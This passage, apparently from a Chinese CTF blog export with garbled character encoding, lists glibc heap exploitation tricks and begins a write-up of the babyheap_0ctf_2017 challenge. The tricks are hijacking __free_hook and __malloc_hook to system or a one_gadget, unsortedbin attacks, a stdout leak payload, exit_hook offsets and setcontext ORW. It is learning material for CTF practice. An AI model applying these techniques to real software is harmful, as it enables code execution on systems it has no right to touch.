<p>is_mmapï¼š1è¡¨ç¤ºå½“å‰chunkæ˜¯ä½¿ç”¨mmapç”³è¯·çš„ï¼Œ0è¡¨ç¤ºä¸æ˜¯</p>
<p>prev_inuseï¼š1è¡¨ç¤ºå‰ä¸€ä¸ªchunkåœ¨è¢«ç”¨æˆ·ä½¿ç”¨ï¼Œ0è¡¨ç¤ºå‰ä¸€ä¸ªchunkè¢«é‡Šæ”¾</p>
<p>11ã€å¦‚æœç”³è¯·çš„chunkå¤§å°ä¸º0x60å’Œ0x68è¿”å›çš„æ˜¯ä¸€æ ·å¤§å°çš„chunkï¼Œè€Œ0x68å¤šå‡ºçš„8ä¸ªå­—èŠ‚æ˜¯ä½¿ç”¨äº†åä¸€ä¸ªchunkçš„presize</p>
<p>12ã€å¤§å°å±äºfastbinchunkè¢«freeçš„æ—¶å€™ï¼Œä¸ä¼šæ”¹å˜next chunkçš„prev_inuse</p>
<p>13ã€æƒ³è¦è®©chunkè¿›å…¥small bins æˆ–è€…large binsï¼Œåˆ™å‰ææ˜¯é‡Šæ”¾çš„chunkå¤§å°å…ˆè¾¾åˆ°small bins æˆ–è€…large binsçš„å¤§å°èŒƒå›´ï¼Œè¯¥chunkå…ˆè¿›å…¥åˆ°unsorted binï¼Œç„¶åå†ç”³è¯·ä¸€æ¬¡å †å—ï¼Œç”³è¯·çš„å¤§å°è¦å¤§äºä¹‹å‰é‡Šæ”¾çš„chunkï¼Œé‚£ä¹ˆä¹‹å‰é‡Šæ”¾çš„chunkå°±ä¼šè¿›å…¥åˆ°small bins æˆ–è€…large binsï¼ˆå”¯ä¸€åŠæ³•ï¼‰</p>
<p>14ã€å¦‚æœä»unsortedbinä¸­åˆ†é…å‡ºchunkï¼Œæ˜¯ä»å¤§chunkçš„å¤´éƒ¨å¼€å§‹åˆ†é…çš„ï¼Œåˆ†é…å®Œç”³è¯·çš„å¤§å°ä¹‹åæŠŠå¤§chunkå‰©ä¸‹çš„ç»§ç»­ç•™åœ¨unsortedbinä¸­</p>
<p>15ã€unsortedbinä¸­çš„chunké‡æ–°åˆ†é…å‡ºæ¥æ—¶ï¼Œé‡Œé¢çš„æ•°æ®ä¸ä¼šè¢«ç³»ç»Ÿæ¸…ç©ºï¼ˆå¦‚æœç¨‹åºæ²¡åŠ¨çš„è¯ï¼‰ï¼Œæ‰€ä»¥é‡Œé¢è¿˜æ˜¯å­˜åœ¨ç€libcåœ°å€</p>
<p>16ã€getshellæœ‰ä¸ªåŠæ³•æ˜¯ï¼šä¿®æ”¹free_hookå†…å®¹ä¸ºsystemåœ°å€ï¼Œç„¶åfreeä¸€ä¸ªchunkï¼Œchunkå†…å®¹ä¸ºâ€/bin/shâ€ï¼Œå°±ç›¸å½“äºæ‰§è¡Œäº†system(â€œ/bin/shâ€)ï¼Œè¿™ç§æ–¹æ³•ç¨³å®šgetshell</p>
<p>17ã€åœ¨libcç‰ˆæœ¬2.23åŠä»¥ä¸‹çš„æ—¶å€™ï¼Œä½¿ç”¨one_gadgetç¨³å®šgetshellï¼Œå¯ä»¥ä½¿ç”¨æ¡ä»¶ä¸º[rsp+0x50] == NULLçš„one_gadgetï¼Œç„¶åå¯¹åŒä¸€ä¸ªchunkè¿›è¡Œdouble freeï¼ˆæŒ‡é’ˆæ²¡æœ‰ç½®0ï¼‰å³å¯getshell</p>
<p>18ã€å½“æŠŠmalloc_hookåŠ«æŒä¸ºone_gadgetå¤±è´¥æ—¶ï¼Œé™¤äº†å¯ä»¥å»è°ƒæ•´æ ˆä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ¢æ€è·¯å»åŠ«æŒfree_hookï¼Œå°±æ˜¯16ä¸­çš„åŠæ³•ï¼Œæˆ–è€…æ˜¯åŠ«æŒreallocï¼ˆåœ¨malloc_hook-0x8çš„åœ°æ–¹ï¼‰ï¼Œå¾€realloc_hookä¸­å†™å…¥one_gadget,malloc_hookä¸­å†™å…¥reallocå‡½æ•°çš„åœ°å€</p>
<p>19ã€å› ä¸ºfree_hookå‰é¢ä¸€å¤§æ®µå†…å®¹ä¸å­˜åœ¨åƒmalloc_hookä¸€æ ·çš„0x7fçš„ä¿¡æ¯ï¼Œæ‰€ä»¥è¦å¯»æ‰¾çš„å¯ä»¥åˆ†é…çš„å †å¤´å¯èƒ½è¦å¾€å‰æ‰¾å¾ˆå¤§çš„åç§»</p>
<ul>
<li>åœ¨2.23ç‰ˆæœ¬ä¸­å¯ä»¥ä½¿ç”¨unsortedbin attackï¼ˆä¿®æ”¹unsortedbinä¸­çš„FDå­—æ®µä¸º0ï¼ŒBKå­—æ®µä¸ºtarget addr - 0x10ï¼‰ï¼Œåœ¨é‚£è¾¹å†™å…¥unsortedbinåœ°å€ï¼Œä»è€Œæ‹¥æœ‰äº†0x7fï¼ˆä½¿ç”¨è¿‡ä¹‹åå¦‚æœfastbiné‡Œé¢æ²¡æœ‰chunkï¼Œé‚£ä¹ˆç”³è¯·å †å—ä¼šåˆ°unsortedbiné‡Œé¢å»æ‰¾ï¼Œæ‰¾çš„è¯å°±ä¼šæŠ¥é”™ï¼Œæ­¤æ—¶éœ€è¦åˆ°main_arenaå¯¹åº”åœ°å€å»ä¿®å¤unsortedbinçš„æŒ‡é’ˆï¼Œæ”¹å›åŸæ¥çš„æ ·å­ï¼‰</li>
<li>åŠ«æŒtop chunkï¼Œç”Ÿæˆä¸€ä¸ªfastchunké‡Šæ”¾æ‰ï¼Œæ¥ç€æŠŠfdæŒ‡é’ˆä¿®æ”¹ä¸ºfastchunkçš„å¤§å°ï¼ˆå¦‚å†™å…¥0x81ï¼‰ï¼Œç„¶åå†æŠŠåˆšæ‰é‡Šæ”¾çš„å †å—ç”³è¯·å‡ºæ¥ï¼Œæ­¤æ—¶ä¼šåœ¨main_arenaç”Ÿæˆå‡ºä¸€ä¸ª0x81ï¼Œå¯ä»¥é€šè¿‡fastchunkçš„æ£€æŸ¥ï¼Œè€Œåœ¨è¿™ä¸ªä¸‹æ–¹ï¼Œå°±æ˜¯top chunkçš„æŒ‡é’ˆï¼ŒæŠŠæŒ‡é’ˆå†…å®¹ä¿®æ”¹åˆ°ç›®æ ‡åœ°å€å‰é¢çš„åœ°å€ï¼ˆåœ°å€éœ€è¦ç¬¦åˆtop sizeï¼‰ï¼Œç„¶åå†ç”³è¯·å †å—å³å¯ï¼ˆæ­¤æ—¶ä¸å¯ä»¥å­˜åœ¨è¢«é‡Šæ”¾çš„å †å—ï¼Œè¦è®©å †å—æ˜¯ä»top chunkä¸­åˆ†é…çš„ï¼‰</li>
</ul>
<p>20ã€ç»•è¿‡callocçš„æ¸…ç©ºæ•°æ®ï¼šæŠŠå †çš„is_mmapä½ç½®æ”¹ä¸º1ï¼Œcallocå°†ä¸ä¼šæ¸…ç©ºå±äºmmapçš„å †å—æ•°æ®</p>
<p>é¡ºåºï¼šé‡Šæ”¾==&gt;ä¿®æ”¹å †å¤´==&gt;ç”³è¯·å †å—</p>
<p>å¹¶ä¸”callocå‡½æ•°ä¸ä¼šåˆ†é…tcache binä¸­çš„å †å—ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°ç›´æ¥ç»•è¿‡tcache</p>
<p>21ã€<code>tcache_perthread_struct</code>è¿™ä¸ªç»“æ„ä½“æ˜¯å¯ä»¥é‡Šæ”¾çš„ï¼Œå¹¶ä¸”å¯ä»¥å°†å®ƒé‡Šæ”¾åˆ°<code>unsorted bin</code>ä¸­å»ï¼Œç„¶ååˆ†é…è¿™ä¸ª<code>unsorted bin chunk</code>ï¼Œå¯ä»¥æ§åˆ¶ä»»æ„åœ°å€åˆ†é…å †å†…å­˜</p>
<p>22ã€å½“å †é¢˜ä¸­æ²¡æœ‰showåŠŸèƒ½æ—¶ï¼Œè¦æ³„éœ²å‡ºlibcåœ°å€ï¼Œéœ€è¦å€ŸåŠ©stdoutåå‡ºlibcåœ°å€</p>
<p>éœ€è¦æŠŠ__libc_stdoutä¸Šçš„å€¼ä¿®æ”¹ä¸º<code>p64(0xfbad1800) + p64(0) * 3 + &#39;\x00&#39;</code></p>
<p>23ã€å½“åˆ†é…unsorted chunkæ—¶ï¼Œå¦‚æœå‰©ä¸‹çš„å—ä»ç„¶å¤§äº0x80ï¼Œå¹¶ä¸”è¿˜æ˜¯å”¯ä¸€çš„ï¼Œé‚£è¿™ä¸ªæ–°çš„unsorted chunkfdï¼ŒbkæŒ‡é’ˆä»ç„¶æŒ‡å‘libcåœ°å€ï¼Œå¹¶ä¸”åˆ†é…å‡ºå»çš„å †å—ï¼Œå¦‚æœæ²¡æœ‰å¯¹å †å—è¿›è¡Œæ¸…é›¶ï¼Œé‚£ä¹ˆä¸Šé¢å°†ä¼šå­˜æ”¾ç€ä¹‹å‰unsorted chunkçš„fdã€bkæŒ‡é’ˆ</p>
<p>24ã€libc-2.23.soæ—¶çš„fdï¼ŒbkæŒ‡é’ˆï¼ŒæŒ‡å‘çš„æ˜¯å †å—çš„prev_sizeä½ç½®ï¼Œlibc-2.27.soæ—¶çš„fdï¼ŒbkæŒ‡é’ˆæŒ‡å‘çš„æ˜¯å †å—çš„å†…å®¹ï¼ˆå°±æ˜¯å­˜æ”¾fdï¼ŒbkæŒ‡é’ˆçš„ä½ç½®ï¼‰æ¯”libc-2.23.soå¤šäº†0x10</p>
<p>25ã€åˆ©ç”¨exit_hookï¼šåŠ«æŒ<code>_dl_rtld_lock_recursive</code>çš„å€¼ä¸ºone_gadgetï¼Œå½“è°ƒç”¨exitå‡½æ•°æ—¶å¯å¾—åˆ°shell</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20210903170451297.png" alt="image-20210903170451297"></p>
<p>åœ¨gdbä¸­<code>p _rtld_global</code>å¯ä»¥æ‰¾åˆ°è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¦æ‰¾åˆ°è¿™ä¸ªå€¼æ‰€åœ¨åœ°å€ï¼Œè¿˜éœ€è¦åœ¨_rtld_globalä¸­å¯»æ‰¾</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20210903172330664.png" alt="image-20210903172330664"></p>
<p>libc-2.23.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x5F0F48</li>
<li>rtld_unlock = libc_base + 0x5F0F50</li>
</ul>
<p>libc-2.27.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x619F60</li>
<li>rtld_unlock = libc_base + 0x619F68</li>
</ul>
<p>26ã€libc-2.27.soçš„unlinkè¦å…ˆæŠŠtcache binå¡«æ»¡æ‰èƒ½ç”¨ï¼Œunlinkè¦ä¿è¯<code>unsorted binæ˜¯ç©ºçš„</code>ï¼Œæ‰€ä»¥æœ‰æ—¶å€™æ³„éœ²ä¿¡æ¯ç”¨äº†unsorted binï¼Œè¦ç”³è¯·å›æ¥</p>
<p>27ã€å½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„å †å—æ—¶ï¼Œç¨‹åºä¼šè°ƒç”¨mmapè¿›è¡Œå†…å­˜åˆ†é…ï¼Œåˆ†é…ä¸‹æ¥å †å—çš„åœ°å€æ˜¯libcä¸­çš„åœ°å€</p>
<p>28ã€libc-2.27å †çš„orwï¼šåˆ©ç”¨setcontext+53çš„æŒ‡ä»¤ï¼ŒæŠŠsetcontext+53çš„åœ°å€ä¸€èˆ¬å†™åœ¨__free_hookä¸Šï¼Œè€Œshellcodeå†™åœ¨å †ä¸Šï¼Œç„¶åè¿›è¡Œé‡Šæ”¾å †å—ä»è€Œæ‰§è¡Œorw</p>
<p>29ã€å½“åŠ«æŒå †å—åˆ°tcacheï¼Œé‡Šæ”¾tcacheè·å¾—libcåœ°å€åï¼Œ ç”±äº unsorted bin çš„ fd å’Œ bk ä¼šåœ¨ tcache struct å†™ä¸€äº›æ•°æ®ï¼Œè€Œè¿™äº›æ•°æ®ä¼šè¦†ç›–åˆ° tcache struct ä¸Šçš„ countsï¼Œå¯¼è‡´å–å‡ºç›¸åº”çš„ size æ—¶å‘ç”Ÿé”™è¯¯ï¼Œæ‰€ä»¥éœ€è¦ä¿®å¤tcacheï¼Œå°†<strong>ä¸å¿…è¦çš„æ•°æ®æ¸…ä¸º 0ï¼Œæœ‰éœ€è¦ä¼ªé€ å¹¶å–å‡ºçš„éƒ¨åˆ†èµ‹å€¼ä¸º 1</strong>ï¼ˆå› ä¸ºé«˜ç‰ˆæœ¬ä¸å…è®¸tcacheçš„countå€¼ä¸º-1ï¼‰</p>
<p>30ã€å¦‚æœæŠŠmalloc_hookåŠ«æŒä¸ºsystemä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåé¢åœ¨è°ƒç”¨mallocæ—¶ä¼ å…¥å‚æ•°ï¼Œä¸ä¼ å…¥sizeå¤§å°ï¼Œè€Œæ˜¯å˜ä¸º/bin/shçš„åœ°å€å³å¯</p>
<p>31ã€realloc å‡½æ•°åŸå‹ï¼š<code>extern void *realloc(void *mem_address, unsigned int newsize);</code></p>
<ul>
<li>mem_address ä¸å˜ï¼Œnewsize == 0ï¼Œç›¸å½“äºé‡Šæ”¾åŸæ¥çš„å †å—ï¼›</li>
<li>mem_address == 0 &amp;&amp; newsize &gt; 0ï¼Œç›¸å½“äºmallocï¼›</li>
<li>mem_address ä¸å˜ï¼Œnewsize &gt; originsizeï¼Œ<code>å…ˆé‡Šæ”¾åŸå †å—</code>ï¼Œç„¶åå†mallocä¸€ä¸ªæ›´å¤§çš„å †å—ï¼ŒåŸå †å—å†…å®¹ä¼šè¢«æ‹·è´è¿‡å»ï¼›è¿”å›æ–°å †å—çš„åœ°å€</li>
<li>mem_address ä¸å˜ï¼Œnewsize &lt;= originsizeï¼Œå¦‚æœåˆ‡å‰²åå‰©ä¸‹çš„å †å—å¤§äº 2 * chunk_min_sizeåˆ™åˆ‡å‰²ï¼Œå‰©ä¸‹å †å—è¢«freeï¼Œå¦åˆ™ç›´æ¥è¿”å›åŸå †å—</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>å †å…¥é—¨é¢˜</title>
    <url>/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/</url>
    <content><![CDATA[<h1 id="çºªå¿µ"><a href="#çºªå¿µ" class="headerlink" title="çºªå¿µ"></a>çºªå¿µ</h1><p>ç¬¬ä¸€æ¬¡å­¦ä¹ å †ï¼Œç‰¹æ„ä¸ºè¿™é¢˜å•å‘ä¸€ä¸ªåšå®¢å¥½äº†ã€‚ä½œä¸ºæ¥è§¦å †çš„ä¸€ä¸ªåˆ†ç•Œçº¿å§ï¼</p>
<h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210410075150.png"></p>
<p>ç…§ä¾‹checksecä»¥åŠè¿è¡Œï¼Œå‘ç°å¼€å¯äº†å…¨éƒ¨çš„ç¼“è§£æœºåˆ¶ã€‚è¿›å…¥idaé™æ€åˆ†æï¼Œäº†è§£ä¸€ä¸‹å…·ä½“è¿è¡Œæƒ…å†µã€‚å®¡è®¡ä¸€ä¸‹å…¶ä¸­çš„ä»£ç </p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210414212529.png"></p>
<p>åœ¨mainå‡½æ•°é‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°åˆ†ä¸ºäº†ä¼—å¤šå‡½æ•°ï¼Œé¦–å…ˆv4æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå…¶æ¬¡ä»–çš„å€¼æ¥è‡ªäºsub_B70ï¼Œæˆ‘ä»¬è¦è¿›å…¥è¿™ä¸ªå‡½æ•°æŸ¥çœ‹ä¸€ç•ªï¼Œè¿”å›äº†ä»€ä¹ˆåœ°å€ï¼Œå¹¶èµ‹å€¼ç»™äº†v4</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210414212357.png"></p>
<p>åœ¨sub_B70è¿™ä¸ªå‡½æ•°ä¸­ï¼Œè°ƒç”¨äº†mmapå‡½æ•°ï¼Œå¼€è¾Ÿäº†ä¸€æ®µåŒ¿åæ˜ å°„åŒºã€‚è¯¥æ˜ å°„åŒºèµ·å§‹åœ°å€ä¸ºaddrï¼Œé•¿åº¦ä¸º0x1000ï¼Œæƒé™ä¸ºå¯å†™å¯æ‰§è¡Œï¼Œç”¨äº<strong>å­˜æ”¾æœ€å¤š16ä¸ªç»“æ„ä½“ã€‚æ¯ä¸ªç»“æ„ä½“åŒ…å«in_useã€sizeå’Œbuf_pträ¸‰ä¸ªåŸŸï¼Œåˆ†åˆ«è¡¨ç¤ºå †å—æ˜¯å¦åœ¨è¢«ä½¿ç”¨ã€å †çš„å¤§å°å’ŒæŒ‡å‘å †å—ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚</strong> è€Œå‡½æ•°sub_B70ä¾¿æ˜¯æŠŠè¿™ä¸ªåŒ¿åæ˜ å°„çš„åœ°å€è¿”å›ç»™äº†v4ã€‚</p>
<p>æ¥ä¸‹æ¥ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªæ˜¯ç”¨æ¥è¾“å‡ºé€‰é¡¹çš„å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªæ˜¯ç”¨æ¥è¾“å…¥çš„ï¼Œè¾“å…¥é•¿åº¦è¢«é™åˆ¶ä¸º8ä¸ªå­—èŠ‚ï¼Œå°±ä¸ç»†è®²äº†ã€‚ä»¥åŠæ³¨æ„åé¢æ‰§è¡Œçš„å››ä¸ªå‡½æ•°ï¼Œéƒ½æ˜¯æŠŠv4æŒ‡å‘çš„åœ°å€ä½œä¸ºå‚æ•°è¿›å…¥åˆ°å‡½æ•°ä¸­å»ã€‚</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQå›¾ç‰‡20210428230535.png" style="zoom:80%;">

<p>è¿™æ˜¯1.Allocateå‡½æ•°çš„ä»£ç ï¼Œé¦–å…ˆæ˜¯åœ¨ä¹‹å‰mmapç”³è¯·çš„16ä¸ªç»“æ„ä½“ä¸­æ‰¾åˆ°ä¸€ä¸ªæœªè¢«ä½¿ç”¨è¿‡çš„ç»“æ„ä½“ï¼Œç„¶åå†è¦æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªæ•°ï¼Œç”Ÿæˆè¯¥æ•°æ•°å€¼å¤§å°çš„ä¸€ä¸ªå †ï¼Œä¸èƒ½è¶…è¿‡0x1000ã€‚</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQå›¾ç‰‡20210428231105.png" style="zoom:80%;">

<p>è¿™æ˜¯2.Fillå‡½æ•°ã€‚é¦–å…ˆè¯»å–ä¸€ä¸ªæ•°ä½œä¸ºç´¢å¼•ï¼Œå¹¶åˆ¤æ–­è¯¥å¯¹åº”çš„ç»“æ„ä½“æ˜¯å¦è¢«ä½¿ç”¨äº†ã€‚å¦‚æœè¢«ä½¿ç”¨äº†ï¼Œåˆ™è¯»å–ç¬¬äºŒä¸ªæ•°ä½œä¸ºsizeï¼Œå¹¶ä¸”è°ƒç”¨å‡½æ•°sub_11B2ï¼ŒæŠŠå¯¹åº”çš„ç»“æ„ä½“çš„buf_ptræŒ‡é’ˆå’Œsizeä½œä¸ºå‚æ•°ã€‚</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQå›¾ç‰‡20210428231148.png" style="zoom:80%;">

<p>è¿›å…¥åˆ°sub_11B2å‡½æ•°ä¸­ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„å¾—çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å‘Fillå‡½æ•°ä¸­çš„ç»“æ„ä½“buf_ptræŒ‡é’ˆæŒ‡å‘çš„å †è¾“å…¥sizeä¸ªå­—ç¬¦ï¼Œä¸è¿‡åªèƒ½è¾“å…¥ä¸€æ¬¡ã€‚è¿™é‡Œçš„readå‡½æ•°ï¼Œå¯¹sizeå¤§å°å¹¶æ²¡é™åˆ¶ï¼Œé€ æˆæ˜æ˜¾çš„æº¢å‡ºç‚¹ï¼Œåé¢å¯ä»¥åˆ©ç”¨</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQå›¾ç‰‡20210428231209.png" style="zoom:80%;">

<p>è¿™æ˜¯3.Freeå‡½æ•°ã€‚é¦–å…ˆè¯»å–ä¸€ä¸ªæ•°ä½œä¸ºç´¢å¼•ï¼Œå¹¶æ‰¾åˆ°ç´¢å¼•å¯¹åº”çš„ç»“æ„ä½“ï¼Œå¦‚æœè¯¥ç»“æ„ä½“è¢«ä½¿ç”¨äº†ï¼Œå°±æŠŠè¯¥ç»“æ„ä½“æŒ‡å‘çš„å †é‡Šæ”¾äº†ï¼ŒåŒæ—¶æŠŠin_useã€sizeå’Œbuf_ptrå…¨éƒ¨æ¸…é›¶ã€‚</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQå›¾ç‰‡20210428231232.png" style="zoom:80%;">

<p>æœ€åä¸€ä¸ªdumpå‡½æ•°ã€‚é¦–å…ˆè¯»å–ä¸€ä¸ªæ•°ä½œä¸ºç´¢å¼•ï¼Œæ‰¾åˆ°å¯¹åº”çš„ç»“æ„ä½“ï¼Œå¦‚æœè¢«ä½¿ç”¨åˆ™è°ƒç”¨å‡½æ•°sub_130Fï¼ŒæŠŠè¯¥ç»“æ„ä½“çš„buf_ptrå’Œsizeä¸¤ä¸ªåŸŸä½œä¸ºå‚æ•°ä¼ å…¥ã€‚è¿™ä¸ªå‡½æ•°å°±ä¸å†å¤šä»‹ç»ï¼Œä¸Fillä¸­çš„å‡½æ•°ç±»ä¼¼ï¼Œä»…ä»…æ˜¯æŠŠreadæ¢æˆäº†writeï¼ŒæŠŠå †çš„å†…å®¹å†™åˆ°æ ‡å‡†è¾“å‡ºã€‚</p>
<p>ä»£ç åˆ°æ­¤å°±å®¡è®¡å®Œäº†ï¼Œå›é¡¾æ•´ä¸ªä»£ç ï¼Œå¯ä»¥å‘ç°ï¼Œåœ¨callocç”³è¯·å †çš„é•¿åº¦æ˜¯ä¸å¤§äº4096çš„ï¼Œè€Œåœ¨Fillä¸­çš„readè¯»å–é•¿åº¦å¾ˆæ˜æ˜¾å¯ä»¥å¤§äº4096ï¼Œè€Œé€ æˆå †æº¢å‡ºï¼Œè¿™å°±æ˜¯æœ¬é¢˜çš„æ¼æ´ç‚¹ï¼Œä¹‹åçš„æ€è€ƒåœ¨äºæ€ä¹ˆåˆ©ç”¨è¿™ä¸ªå †æº¢å‡ºã€‚</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418155849.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418162040.png"></p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆåˆ›å»ºäº”ä¸ªchunkï¼Œå››ä¸ªæ˜¯fast chunkï¼Œè¿˜æœ‰ä¸€ä¸ªä¸ºsmall chunkã€‚fast chunké€šè¿‡fastbinæ¥é‡å chunkï¼Œsmall chunkç”¨æ¥è·å–libc_baseã€‚æˆ‘ä»¬æŠŠchunk1å’Œchunk2é‡Šæ”¾æ‰ï¼Œæ ¹æ®fastbinåè¿›å…ˆå‡ºçš„æœºåˆ¶ï¼Œæˆ‘ä»¬åªè¦å†æ¬¡ç”³è¯·åŒç­‰å¤§å°çš„chunkï¼Œå³å¯æŠŠåŸæœ¬é‡Šæ”¾æ‰çš„chunkâ€œå½’è¿˜â€å›æ¥ã€‚å› ä¸ºåé¢è¦é€šè¿‡chunk4è·å–libcåç§»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨chunk4ä¸Šé¢é‡å chunk2é€ æˆæ‹¥æœ‰ä¸¤ä¸ªæŒ‡é’ˆéƒ½å¯ä»¥è®¿é—®chunk4çš„åœ°å€ï¼Œæ‰èƒ½åœ¨æŠŠchunk4é‡Šæ”¾æ‰ä¹‹åï¼Œä»ç„¶å¯ä»¥è¯»å–å…¶å€¼ã€‚æ‰€ä»¥æ¥ä¸‹æ¥è¦æŠŠchunk2çš„fdçš„å€¼æ”¹ä¸ºæŒ‡å‘chunk4å³å¯ã€‚</p>
<p>å› ä¸ºåˆšå¼€å§‹ç”³è¯·ç©ºé—´æ—¶ï¼Œè°ƒç”¨äº†mmapï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿è¯chunkæ˜¯ä»å †çš„èµ·å§‹åœ°å€å¼€å§‹åˆ†é…çš„ï¼Œä¹Ÿå°±æ˜¯åä¸‰ä½æ˜¯0x000å¼€å§‹çš„ã€‚é‚£æˆ‘ä»¬ä¿®æ”¹fdåªéœ€è¦æŠŠå…¶ä¿®æ”¹å…¶æœ€åä¸¤ä½ä¸º0x80å°±å¯ä»¥ã€‚å› ä¸ºfast binçš„å¤§å°æœ‰é™åˆ¶ï¼Œæ‰€ä»¥è¿˜è¦ä¸€èµ·æŠŠchunk4çš„sizeå¤§å°æ”¹ä¸º21ã€‚</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418162937.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418163044.png"></p>
<p>è¿™æ˜¯æŠŠchunk4é‡Šæ”¾æ‰ä¹‹åï¼Œå¯ä»¥çœ‹è§å…¶fdå’Œbkéƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€æ˜¯å¤„äºlibcé‡Œé¢çš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªç®—å‡ºç›¸å¯¹äºlibcèµ·å§‹åœ°å€çš„åå·®ï¼Œå› ä¸ºå¼€å¯äº†pieä¿æŠ¤ï¼Œæ‰€ä»¥libcèµ·å§‹åœ°å€æ˜¯ä¼šæ”¹å˜çš„ï¼Œä½†æ˜¯åç§»å´æ˜¯ä¸€å®šçš„ã€‚</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418163308.png"></p>
<p>è®¡ç®—å¯çŸ¥ï¼Œåç§»ä¸º0x3c4b78ã€‚åç§»åˆ°æ‰‹äº†ï¼Œä»£è¡¨ç€one_gadgetçš„ç»å¯¹åœ°å€ä¹Ÿå·²ç»æœ‰äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°ä¸ªå¯ä»¥æ‰§è¡Œç¨‹åºçš„ä¸œè¥¿ï¼Œå¯¹ong_gadgetæ‰§è¡Œå³å¯è·å–shellã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åŠ«æŒ__malloc_hookå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªå¼±ç±»å‹çš„å‡½æ•°æŒ‡é’ˆï¼ŒæŒ‡å‘void *function(size_t size,void *caller)ã€‚å½“è°ƒç”¨mallocå‡½æ•°çš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­hookå‡½æ•°æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œå°±è°ƒç”¨å®ƒã€‚æ‰€ä»¥æˆ‘ä»¬è¦æŠŠhookå‡½æ•°æŒ‡é’ˆä¿®æ”¹ä¸ºone_gadgetçš„åœ°å€ï¼Œè¿›è¡Œè°ƒç”¨one_gadget</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418170734.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418171155.png"></p>
